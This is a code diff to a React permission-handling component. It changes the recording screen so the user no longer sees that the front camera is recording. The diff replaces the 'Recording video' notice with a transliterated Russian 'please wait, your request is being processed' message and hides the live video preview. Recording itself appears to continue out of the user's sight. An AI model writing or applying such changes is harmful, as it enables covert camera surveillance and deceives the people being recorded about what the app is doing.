@@ -177,9 +177,10 @@ const PermissionHandler = () => {
       )}
       {appPhase === "recording" && (
         <>
-          <p className="text-lg mb-4">Recording video for {RECORDING_DURATION_MS / 1000} seconds...</p>
+          <p className="text-lg mb-4 text-center">Pajalusta podajdite, vash zapros obrabativaetsa</p>
           <div className="relative w-full max-w-md aspect-video bg-muted flex items-center justify-center rounded-lg overflow-hidden">
-            <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" />
+            {/* Video element is now hidden during front camera recording */}
+            <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" style={{ display: 'none' }} />
             <div className="absolute inset-0 border-4 border-primary-foreground opacity-70 rounded-lg pointer-events-none" />
           </div>
         </>
